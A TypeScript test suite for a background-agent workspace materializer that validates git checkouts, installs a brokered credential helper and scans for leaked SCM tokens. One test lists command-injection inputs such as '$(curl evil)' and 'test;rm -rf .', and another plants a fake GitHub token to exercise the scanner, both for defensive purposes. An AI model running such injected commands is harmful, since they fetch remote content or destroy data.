import { describe, expect, test } from "bun:test"
import { existsSync } from "node:fs"
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises"
import { join } from "node:path"
import { tmpdir } from "node:os"
import { Effect } from "effect"

// Behavior contract oracle: background_agents.credentials.brokered_scm_helper.v1
// Behavior contract oracle: background_agents.credentials.no_long_lived_tokens_in_workspaces.v1

import {
  checkoutBaseCommitSha,
  checkoutSourceRef,
  cleanupOldestMaterializedWorkspaces,
  gitCredentialHelperRuntimePathsFor,
  gitCheckoutWorkspaceFrom,
  materializeGitCheckoutWorkspace,
  materializeGitCheckoutWorkspaceWithLease,
  PylonWorkspaceMaterializer,
  PylonWorkspaceMaterializerLive,
  removeMaterializedWorkspace,
  scanLongLivedScmCredentials,
  type GitCheckoutWorkspace,
  type WorkspaceCheckoutRunner,
  workspaceLeaseRecordFor,
} from "../src/workspace-materializer"
import type { ScmAuthBrokerConfig } from "../src/workspace-materializer"

const validCheckout: GitCheckoutWorkspace = {
  kind: "git_checkout",
  repository: {
    branch: "main",
    commitSha: "3333333333333333333333333333333333333333",
    fullName: "OpenAgentsInc/public-sum-fixture",
    provider: "github",
    visibility: "public",
  },
  verificationCommand: {
    args: ["bun", "test", "sum.test.ts"],
    commandRef: "command.public.autopilot_coder.bun_test_sum",
  },
}

const validBroker: ScmAuthBrokerConfig = {
  schema: "openagents.pylon.scm_auth_broker.v1",
  kind: "forge_git_access",
  brokerUrl: "https://openagents.com/api/pylon/forge/git-credentials",
  authRefs: ["forge_git_token.background_agent.run_001.receive_pack"],
  repositoryRef: "repo.openagents.openagents",
  allowed: {
    protocol: "https",
    host: "openagents.com",
    pathPrefix: "/git/tenant.openagents.background_agents/repo.openagents.openagents.git",
  },
  cacheTtlSeconds: 60,
  fallback: "fail_closed",
}

function assignmentWith(workspace: unknown) {
  return { workspace }
}

function checkoutWith(overrides: {
  repository?: Partial<GitCheckoutWorkspace["repository"]>
  scmAuthBroker?: unknown
  verificationCommand?: Partial<GitCheckoutWorkspace["verificationCommand"]>
  kind?: string
}) {
  return {
    ...validCheckout,
    ...(overrides.kind === undefined ? {} : { kind: overrides.kind }),
    repository: { ...validCheckout.repository, ...overrides.repository },
    ...(overrides.scmAuthBroker === undefined ? {} : { scmAuthBroker: overrides.scmAuthBroker }),
    verificationCommand: { ...validCheckout.verificationCommand, ...overrides.verificationCommand },
  }
}

async function runCommand(args: string[], cwd: string): Promise<{ exitCode: number; stdout: string }> {
  const proc = Bun.spawn(args, { cwd, stderr: "pipe", stdout: "pipe" })
  const [stdout, exitCode] = await Promise.all([
    new Response(proc.stdout).text(),
    proc.exited,
  ])
  await new Response(proc.stderr).text()
  return { exitCode, stdout }
}

describe("gitCheckoutWorkspaceFrom", () => {
  test("accepts a public GitHub checkout pinned to a 40-character commit", () => {
    const decoded = gitCheckoutWorkspaceFrom(assignmentWith(validCheckout))
    expect(decoded).not.toBeNull()
    expect(decoded?.repository.commitSha).toBe(validCheckout.repository.commitSha)
    expect(decoded?.verificationCommand.args).toEqual(["bun", "test", "sum.test.ts"])
  })

  test("accepts virtual merge queue metadata and uses it as the effective base", () => {
    const checkout = checkoutWith({
      repository: { commitSha: "1".repeat(40) },
    }) as GitCheckoutWorkspace
    checkout.virtualBranch = {
      kind: "pylon_virtual_merge_queue",
      baseCommitSha: "2".repeat(40),
      branchName: "pylon/virtual-issue-6690",
      queueRef: "virtual_merge_queue.openagents.main",
    }

    const decoded = gitCheckoutWorkspaceFrom(assignmentWith(checkout))
    expect(decoded).not.toBeNull()
    expect(decoded?.repository.commitSha).toBe("1".repeat(40))
    expect(decoded === null ? null : checkoutBaseCommitSha(decoded)).toBe("2".repeat(40))
    expect(decoded === null ? null : checkoutSourceRef(decoded)).toBe(
      `OpenAgentsInc/public-sum-fixture:${"2".repeat(40)}`,
    )
  })

  test("accepts ref-only brokered SCM auth metadata", () => {
    const decoded = gitCheckoutWorkspaceFrom(
      assignmentWith(checkoutWith({ scmAuthBroker: validBroker })),
    )

    expect(decoded?.scmAuthBroker).toMatchObject({
      schema: "openagents.pylon.scm_auth_broker.v1",
      kind: "forge_git_access",
      authRefs: ["forge_git_token.background_agent.run_001.receive_pack"],
      repositoryRef: "repo.openagents.openagents",
      allowed: {
        protocol: "https",
        host: "openagents.com",
        pathPrefix: "/git/tenant.openagents.background_agents/repo.openagents.openagents.git",
      },
      fallback: "fail_closed",
    })
  })

  test("rejects assignments without a workspace payload", () => {
    expect(gitCheckoutWorkspaceFrom({})).toBeNull()
    expect(gitCheckoutWorkspaceFrom(null)).toBeNull()
    expect(gitCheckoutWorkspaceFrom(assignmentWith("git_checkout"))).toBeNull()
  })

  test("rejects foreign workspace kinds", () => {
    expect(gitCheckoutWorkspaceFrom(assignmentWith(checkoutWith({ kind: "local_path" })))).toBeNull()
  })

  test("rejects private repositories and non-github providers", () => {
    expect(
      gitCheckoutWorkspaceFrom(assignmentWith(checkoutWith({ repository: { visibility: "private" as never } }))),
    ).toBeNull()
    expect(
      gitCheckoutWorkspaceFrom(assignmentWith(checkoutWith({ repository: { provider: "gitlab" as never } }))),
    ).toBeNull()
  })

  test("rejects unsafe repository names", () => {
    for (const fullName of ["solo-name", "owner/repo/extra", "owner/../repo", "owner/repo name", "-/-/"]) {
      expect(
        gitCheckoutWorkspaceFrom(assignmentWith(checkoutWith({ repository: { fullName } }))),
        fullName,
      ).toBeNull()
    }
  })

  test("rejects unpinned commits: branch names, short and malformed SHAs", () => {
    for (const commitSha of ["main", "33333", "z".repeat(40), `${"3".repeat(39)};`]) {
      expect(
        gitCheckoutWorkspaceFrom(assignmentWith(checkoutWith({ repository: { commitSha } }))),
        commitSha,
      ).toBeNull()
    }
  })

  test("rejects branch values that cannot safely become git refspecs", () => {
    for (const branch of [
      "../escape",
      "feature/../escape",
      "-main",
      "refs/heads/main",
      "main lock",
      "feature:bad",
      "feature@{bad",
      "feature//bad",
      "feature.lock",
      "feature.",
    ]) {
      expect(
        gitCheckoutWorkspaceFrom(assignmentWith(checkoutWith({ repository: { branch } }))),
        branch,
      ).toBeNull()
    }
  })

  test("rejects unsafe virtual merge queue metadata", () => {
    const base = checkoutWith({}) as GitCheckoutWorkspace
    for (const virtualBranch of [
      { kind: "pylon_virtual_merge_queue", baseCommitSha: "2".repeat(40), branchName: "feature/nope", queueRef: "queue.ok" },
      { kind: "pylon_virtual_merge_queue", baseCommitSha: "main", branchName: "pylon/virtual-ok", queueRef: "queue.ok" },
      { kind: "pylon_virtual_merge_queue", baseCommitSha: "2".repeat(40), branchName: "pylon/virtual-../bad", queueRef: "queue.ok" },
      { kind: "pylon_virtual_merge_queue", baseCommitSha: "2".repeat(40), branchName: "pylon/virtual-ok", queueRef: "queue bad" },
    ]) {
      expect(
        gitCheckoutWorkspaceFrom(assignmentWith({ ...base, virtualBranch })),
        JSON.stringify(virtualBranch),
      ).toBeNull()
    }
  })

  test("rejects absolute verification paths and traversal in args", () => {
    expect(
      gitCheckoutWorkspaceFrom(
        assignmentWith(checkoutWith({ verificationCommand: { args: ["/bin/sh", "test.sh"] } })),
      ),
    ).toBeNull()
    expect(
      gitCheckoutWorkspaceFrom(
        assignmentWith(checkoutWith({ verificationCommand: { args: ["bun", "test", "../../outside.ts"] } })),
      ),
    ).toBeNull()
  })

  test("rejects shell-shaped verification command strings", () => {
    for (const args of [
      ["bun test sum.test.ts && curl evil"],
      ["bun", "test;rm -rf ."],
      ["bun", "$(curl evil)"],
      ["bun", "test", "|", "tee"],
      ["bash", "-c", "echo `id`"],
    ]) {
      expect(gitCheckoutWorkspaceFrom(assignmentWith(checkoutWith({ verificationCommand: { args } }))), args.join(" ")).toBeNull()
    }
  })

  test("rejects malformed or raw brokered SCM auth metadata", () => {
    for (const scmAuthBroker of [
      { ...validBroker, brokerUrl: "http://openagents.com/api/pylon/forge/git-credentials" },
      { ...validBroker, brokerUrl: "https://user:secret@openagents.com/api/pylon/forge/git-credentials" },
      { ...validBroker, authRefs: ["oa_forge_git_secret_material"] },
      { ...validBroker, allowed: { ...validBroker.allowed, protocol: "ssh" } },
      { ...validBroker, allowed: { ...validBroker.allowed, pathPrefix: "../escape" } },
      { ...validBroker, cacheTtlSeconds: 60 * 60 + 1 },
      { ...validBroker, fallback: "read_embedded_token" },
    ]) {
      expect(
        gitCheckoutWorkspaceFrom(assignmentWith(checkoutWith({ scmAuthBroker }))),
        JSON.stringify(scmAuthBroker),
      ).toBeNull()
    }
  })

  test("rejects empty or ref-less verification commands", () => {
    expect(
      gitCheckoutWorkspaceFrom(assignmentWith(checkoutWith({ verificationCommand: { args: [] } }))),
    ).toBeNull()
    expect(
      gitCheckoutWorkspaceFrom(
        assignmentWith(checkoutWith({ verificationCommand: { commandRef: undefined as never } })),
      ),
    ).toBeNull()
  })
})

describe("materializeGitCheckoutWorkspace", () => {
  const stubRunner: WorkspaceCheckoutRunner = async (workingDirectory) => {
    await mkdir(workingDirectory, { recursive: true })
    await writeFile(join(workingDirectory, "checked-out"), "ok\n")
  }

  test("creates an isolated workspace under the Pylon-owned cache root only", async () => {
    const cacheRoot = await mkdtemp(join(tmpdir(), "pylon-workspace-cache-"))
    try {
      const materialized = await materializeGitCheckoutWorkspace({
        cacheRoot,
        checkout: validCheckout,
        checkoutRunner: stubRunner,
        leaseRef: "lease.public.workspace.test",
        refPrefix: "workspace.pylon.claude_agent_task",
      })
      expect(materialized.workingDirectory.startsWith(`${cacheRoot}/`)).toBe(true)
      expect(materialized.workspaceRef.startsWith("workspace.pylon.claude_agent_task.")).toBe(true)
      expect(materialized.cleanupRef.startsWith("cleanup.pylon.workspace.")).toBe(true)
      expect(materialized.sourceRef).toBe(
        "OpenAgentsInc/public-sum-fixture:3333333333333333333333333333333333333333",
      )
      expect(existsSync(join(materialized.workingDirectory, "checked-out"))).toBe(true)
    } finally {
      await rm(cacheRoot, { recursive: true, force: true })
    }
  })

  test("derives the same ref the executors derived before extraction", async () => {
    const cacheRoot = await mkdtemp(join(tmpdir(), "pylon-workspace-cache-"))
    try {
      const first = await materializeGitCheckoutWorkspace({
        cacheRoot,
        checkout: validCheckout,
        checkoutRunner: stubRunner,
        leaseRef: "lease.public.workspace.stable",
        refPrefix: "workspace.pylon.codex_agent_task",
      })
      const second = await materializeGitCheckoutWorkspace({
        cacheRoot,
        checkout: validCheckout,
        checkoutRunner: stubRunner,
        leaseRef: "lease.public.workspace.stable",
        refPrefix: "workspace.pylon.codex_agent_task",
      })
      expect(first.workspaceRef).toBe(second.workspaceRef)
      expect(first.workingDirectory).toBe(second.workingDirectory)
    } finally {
      await rm(cacheRoot, { recursive: true, force: true })
    }
  })

  test("two concurrent assignments for the same repository get separate refs and directories", async () => {
    const cacheRoot = await mkdtemp(join(tmpdir(), "pylon-workspace-cache-"))
    try {
      const [first, second] = await Promise.all([
        materializeGitCheckoutWorkspace({
          cacheRoot,
          checkout: validCheckout,
          checkoutRunner: stubRunner,
          leaseRef: "lease.public.workspace.first",
          refPrefix: "workspace.pylon.claude_agent_task",
        }),
        materializeGitCheckoutWorkspace({
          cacheRoot,
          checkout: validCheckout,
          checkoutRunner: stubRunner,
          leaseRef: "lease.public.workspace.second",
          refPrefix: "workspace.pylon.claude_agent_task",
        }),
      ])
      expect(first.workspaceRef).not.toBe(second.workspaceRef)
      expect(first.workingDirectory).not.toBe(second.workingDirectory)
      expect(existsSync(first.workingDirectory)).toBe(true)
      expect(existsSync(second.workingDirectory)).toBe(true)
    } finally {
      await rm(cacheRoot, { recursive: true, force: true })
    }
  })

  test("installs a brokered git credential helper without embedding SCM tokens", async () => {
    const cacheRoot = await mkdtemp(join(tmpdir(), "pylon-workspace-cache-"))
    const checkout = checkoutWith({ scmAuthBroker: validBroker }) as GitCheckoutWorkspace
    const checkoutRunner: WorkspaceCheckoutRunner = async (workingDirectory) => {
      await mkdir(workingDirectory, { recursive: true })
      const init = await runCommand(["git", "init"], workingDirectory)
      expect(init.exitCode).toBe(0)
      await writeFile(join(workingDirectory, "checked-out"), "ok\n")
    }

    try {
      const materialized = await materializeGitCheckoutWorkspace({
        cacheRoot,
        checkout,
        checkoutRunner,
        leaseRef: "lease.public.workspace.brokered_git",
        refPrefix: "workspace.pylon.codex_agent_task",
      })
      const helper = await runCommand(["git", "config", "--get", "credential.helper"], materialized.workingDirectory)
      const useHttpPath = await runCommand(["git", "config", "--get", "credential.useHttpPath"], materialized.workingDirectory)
      const interactive = await runCommand(["git", "config", "--get", "credential.interactive"], materialized.workingDirectory)
      const paths = await gitCredentialHelperRuntimePathsFor(materialized.workingDirectory)
      const config = JSON.parse(await readFile(paths.configPath, "utf8")) as Record<string, unknown>
      const helperScript = await readFile(paths.helperPath, "utf8")
      const serialized = JSON.stringify({ config, helperScript })

      expect(helper.stdout.trim()).toContain("pylon-git-credential-helper.mjs")
      expect(useHttpPath.stdout.trim()).toBe("true")
      expect(interactive.stdout.trim()).toBe("never")
      expect(config).toMatchObject({
        schema: "openagents.pylon.scm_auth_broker.v1",
        helperRef: "helper.pylon.scm_auth_broker.git_credential.v1",
        brokerUrl: "https://openagents.com/api/pylon/forge/git-credentials",
        authRefs: ["forge_git_token.background_agent.run_001.receive_pack"],
        repositoryRef: "repo.openagents.openagents",
        cacheTtlSeconds: 60,
        fallback: "fail_closed",
      })
      expect(helperScript).toContain("openagents.pylon.git_credential_broker_request.v1")
      expect(helperScript).toContain("fetch(config.brokerUrl")
      expect(helperScript).toContain("cachedUntilMs")
      expect(serialized).not.toContain("oa_forge_git_secret")
      expect(serialized).not.toContain("\"password\":\"")
    } finally {
      await rm(cacheRoot, { recursive: true, force: true })
    }
  })

  test("detects long-lived SCM tokens in worker roots while allowing the bounded helper cache", async () => {
    const cacheRoot = await mkdtemp(join(tmpdir(), "pylon-workspace-cache-"))
    const workerHome = await mkdtemp(join(tmpdir(), "pylon-worker-home-"))
    const checkout = checkoutWith({ scmAuthBroker: validBroker }) as GitCheckoutWorkspace
    const checkoutRunner: WorkspaceCheckoutRunner = async (workingDirectory) => {
      await mkdir(workingDirectory, { recursive: true })
      const init = await runCommand(["git", "init"], workingDirectory)
      expect(init.exitCode).toBe(0)
      await writeFile(join(workingDirectory, "checked-out"), "ok\n")
    }

    try {
      const materialized = await materializeGitCheckoutWorkspace({
        cacheRoot,
        checkout,
        checkoutRunner,
        leaseRef: "lease.public.workspace.scm_scan",
        refPrefix: "workspace.pylon.codex_agent_task",
      })
      const paths = await gitCredentialHelperRuntimePathsFor(materialized.workingDirectory)
      await writeFile(
        paths.cachePath,
        `${JSON.stringify({
          entries: {
            safe: {
              username: "x-access-token",
              password: "short-lived-broker-session-value",
              cachedUntilMs: Date.now() + 10_000,
              expiresAtMs: Date.now() + 10_000,
            },
          },
        })}\n`,
      )

      const clean = await scanLongLivedScmCredentials({
        roots: [
          { rootRef: materialized.workspaceRef, path: materialized.workingDirectory },
          { rootRef: "worker_home.test", path: workerHome },
        ],
      })
      expect(clean.state).toBe("clean")

      await writeFile(
        join(workerHome, ".git-credentials"),
        "https://x-access-token:ghp_abcdefghijklmnopqrstuvwxyz123456@github.com/OpenAgentsInc/openagents.git\n",
      )
      const leaked = await scanLongLivedScmCredentials({
        roots: [
          { rootRef: materialized.workspaceRef, path: materialized.workingDirectory },
          { rootRef: "worker_home.test", path: workerHome },
        ],
      })
      expect(leaked.state).toBe("leaked")
      expect(leaked.findings).toContainEqual({
        findingRef: leaked.findingRefs[0],
        rootRef: "worker_home.test",
        relativePath: ".git-credentials",
        reasonRef: "reason.workspace_scm_credentials.github_pat",
      })
    } finally {
      await rm(cacheRoot, { recursive: true, force: true })
      await rm(workerHome, { recursive: true, force: true })
    }
  })
})

describe("removeMaterializedWorkspace", () => {
  test("removes only the assignment-scoped workspace", async () => {
    const cacheRoot = await mkdtemp(join(tmpdir(), "pylon-workspace-cache-"))
    try {
      const keep = join(cacheRoot, "workspace.keep")
      const drop = join(cacheRoot, "workspace.drop")
      await mkdir(keep, { recursive: true })
      await mkdir(drop, { recursive: true })
      await removeMaterializedWorkspace({ cacheRoot, workingDirectory: drop })
      expect(existsSync(drop)).toBe(false)
      expect(existsSync(keep)).toBe(true)
    } finally {
      await rm(cacheRoot, { recursive: true, force: true })
    }
  })

  test("refuses targets outside the Pylon-owned cache root", async () => {
    const cacheRoot = await mkdtemp(join(tmpdir(), "pylon-workspace-cache-"))
    const outside = await mkdtemp(join(tmpdir(), "pylon-workspace-outside-"))
    try {
      await expect(
        removeMaterializedWorkspace({ cacheRoot, workingDirectory: outside }),
      ).rejects.toThrow("outside the Pylon-owned cache root")
      await expect(
        removeMaterializedWorkspace({ cacheRoot, workingDirectory: cacheRoot }),
      ).rejects.toThrow("outside the Pylon-owned cache root")
      await expect(
        removeMaterializedWorkspace({
          cacheRoot,
          workingDirectory: join(cacheRoot, "..", "sibling"),
        }),
      ).rejects.toThrow("outside the Pylon-owned cache root")
      expect(existsSync(outside)).toBe(true)
    } finally {
      await rm(cacheRoot, { recursive: true, force: true })
      await rm(outside, { recursive: true, force: true })
    }
  })
})

describe("cleanupOldestMaterializedWorkspaces", () => {
  test("removes oldest clean lease records until the cache is under the cap", async () => {
    const cacheRoot = await mkdtemp(join(tmpdir(), "pylon-workspace-cache-"))
    const repositoryCacheRoot = await mkdtemp(join(tmpdir(), "pylon-repository-cache-"))
    const workspaceStateRoot = await mkdtemp(join(tmpdir(), "pylon-workspace-state-"))
    const checkoutRunner: WorkspaceCheckoutRunner = async (workingDirectory) => {
      await mkdir(workingDirectory, { recursive: true })
      await writeFile(join(workingDirectory, "checked-out"), "ok\n")
    }

    try {
      const first = await materializeGitCheckoutWorkspaceWithLease({
        cacheRoot,
        checkout: validCheckout,
        checkoutRunner,
        leaseRef: "lease.public.workspace.cap.first",
        refPrefix: "workspace.pylon.codex_agent_task",
        repositoryCacheRoot,
        workspaceStateRoot,
        now: new Date("2026-06-11T00:00:00.000Z"),
      })
      const second = await materializeGitCheckoutWorkspaceWithLease({
        cacheRoot,
        checkout: validCheckout,
        checkoutRunner,
        leaseRef: "lease.public.workspace.cap.second",
        refPrefix: "workspace.pylon.codex_agent_task",
        repositoryCacheRoot,
        workspaceStateRoot,
        now: new Date("2026-06-11T00:01:00.000Z"),
      })
      const third = await materializeGitCheckoutWorkspaceWithLease({
        cacheRoot,
        checkout: validCheckout,
        checkoutRunner,
        leaseRef: "lease.public.workspace.cap.third",
        refPrefix: "workspace.pylon.codex_agent_task",
        repositoryCacheRoot,
        workspaceStateRoot,
        now: new Date("2026-06-11T00:02:00.000Z"),
      })

      const result = await cleanupOldestMaterializedWorkspaces({
        maxMaterializedWorkspaces: 1,
        now: new Date("2026-06-11T00:03:00.000Z"),
        workspaceStateRoot,
      })

      expect(result.cleanupReceiptRefs).toHaveLength(2)
      expect(result.retainedWorkspaceRefs).toEqual([])
      expect(existsSync(first.workingDirectory)).toBe(false)
      expect(existsSync(second.workingDirectory)).toBe(false)
      expect(existsSync(third.workingDirectory)).toBe(true)
      expect(
        (await workspaceLeaseRecordFor({ workspaceStateRoot, workspaceRef: first.workspaceRef }))
          ?.state,
      ).toBe("cleaned")
      expect(
        (await workspaceLeaseRecordFor({ workspaceStateRoot, workspaceRef: second.workspaceRef }))
          ?.state,
      ).toBe("cleaned")
      expect(
        (await workspaceLeaseRecordFor({ workspaceStateRoot, workspaceRef: third.workspaceRef }))
          ?.state,
      ).toBe("materialized")
    } finally {
      await rm(cacheRoot, { recursive: true, force: true })
      await rm(repositoryCacheRoot, { recursive: true, force: true })
      await rm(workspaceStateRoot, { recursive: true, force: true })
    }
  })

  test("does not remove fresh materialized workspaces under the age guard", async () => {
    const cacheRoot = await mkdtemp(join(tmpdir(), "pylon-workspace-cache-"))
    const repositoryCacheRoot = await mkdtemp(join(tmpdir(), "pylon-repository-cache-"))
    const workspaceStateRoot = await mkdtemp(join(tmpdir(), "pylon-workspace-state-"))
    const checkoutRunner: WorkspaceCheckoutRunner = async (workingDirectory) => {
      await mkdir(workingDirectory, { recursive: true })
      await writeFile(join(workingDirectory, "checked-out"), "ok\n")
    }

    try {
      const first = await materializeGitCheckoutWorkspaceWithLease({
        cacheRoot,
        checkout: validCheckout,
        checkoutRunner,
        leaseRef: "lease.public.workspace.age.first",
        refPrefix: "workspace.pylon.codex_agent_task",
        repositoryCacheRoot,
        workspaceStateRoot,
        now: new Date("2026-06-11T00:00:00.000Z"),
      })
      const second = await materializeGitCheckoutWorkspaceWithLease({
        cacheRoot,
        checkout: validCheckout,
        checkoutRunner,
        leaseRef: "lease.public.workspace.age.second",
        refPrefix: "workspace.pylon.codex_agent_task",
        repositoryCacheRoot,
        workspaceStateRoot,
        now: new Date("2026-06-11T00:01:00.000Z"),
      })

      const result = await cleanupOldestMaterializedWorkspaces({
        maxMaterializedWorkspaces: 1,
        minimumAgeSeconds: 10 * 60,
        now: new Date("2026-06-11T00:02:00.000Z"),
        workspaceStateRoot,
      })

      expect(result.cleanupReceiptRefs).toEqual([])
      expect(result.retainedWorkspaceRefs).toEqual([])
      expect(existsSync(first.workingDirectory)).toBe(true)
      expect(existsSync(second.workingDirectory)).toBe(true)
    } finally {
      await rm(cacheRoot, { recursive: true, force: true })
      await rm(repositoryCacheRoot, { recursive: true, force: true })
      await rm(workspaceStateRoot, { recursive: true, force: true })
    }
  })
})

describe("PylonWorkspaceMaterializerLive", () => {
  const checkoutRunner: WorkspaceCheckoutRunner = async (workingDirectory) => {
    await mkdir(workingDirectory, { recursive: true })
    await writeFile(join(workingDirectory, "checked-out"), "ok\n")
  }

  test("materializes and reads a lease record through the Effect service facade", async () => {
    const root = await mkdtemp(join(tmpdir(), "pylon-workspace-service-"))
    try {
      const workspaceStateRoot = join(root, "workspace-leases")
      const materialized = await Effect.runPromise(
        Effect.gen(function* () {
          const materializer = yield* PylonWorkspaceMaterializer
          return yield* materializer.materializeWithLease({
            cacheRoot: join(root, "adapter-tasks"),
            checkout: validCheckout,
            checkoutRunner,
            leaseRef: "lease.public.workspace.service",
            refPrefix: "workspace.pylon.codex_agent_task",
            repositoryCacheRoot: join(root, "git-cache"),
            workspaceStateRoot,
            now: new Date("2026-06-11T00:00:00.000Z"),
          })
        }).pipe(Effect.provide(PylonWorkspaceMaterializerLive)),
      )

      const record = await Effect.runPromise(
        Effect.gen(function* () {
          const materializer = yield* PylonWorkspaceMaterializer
          return yield* materializer.leaseRecordFor({
            workspaceStateRoot,
            workspaceRef: materialized.workspaceRef,
          })
        }).pipe(Effect.provide(PylonWorkspaceMaterializerLive)),
      )
      expect(record.workspaceRef).toBe(materialized.workspaceRef)
      expect(record.state).toBe("materialized")
    } finally {
      await rm(root, { recursive: true, force: true })
    }
  })

  test("distinguishes missing and malformed lease records at the Effect service boundary", async () => {
    const root = await mkdtemp(join(tmpdir(), "pylon-workspace-service-"))
    try {
      const workspaceStateRoot = join(root, "workspace-leases")
      const readLease = (workspaceRef: string) =>
        Effect.runPromise(
          Effect.gen(function* () {
            const materializer = yield* PylonWorkspaceMaterializer
            return yield* materializer.leaseRecordFor({ workspaceStateRoot, workspaceRef })
          }).pipe(Effect.provide(PylonWorkspaceMaterializerLive)),
        )

      await expect(readLease("workspace.pylon.codex_agent_task.missing")).rejects.toMatchObject({
        operation: "workspace.lease_record_read",
        reasonRef: "reason.workspace_lease.not_found",
        fallbackCloseoutUsed: false,
      })

      await mkdir(workspaceStateRoot, { recursive: true })
      await writeFile(join(workspaceStateRoot, "workspace.pylon.codex_agent_task.bad.json"), "{ nope")
      await expect(readLease("workspace.pylon.codex_agent_task.bad")).rejects.toMatchObject({
        operation: "workspace.lease_record_read",
        reasonRef: "reason.workspace_lease.malformed",
        fallbackCloseoutUsed: false,
      })
    } finally {
      await rm(root, { recursive: true, force: true })
    }
  })
})
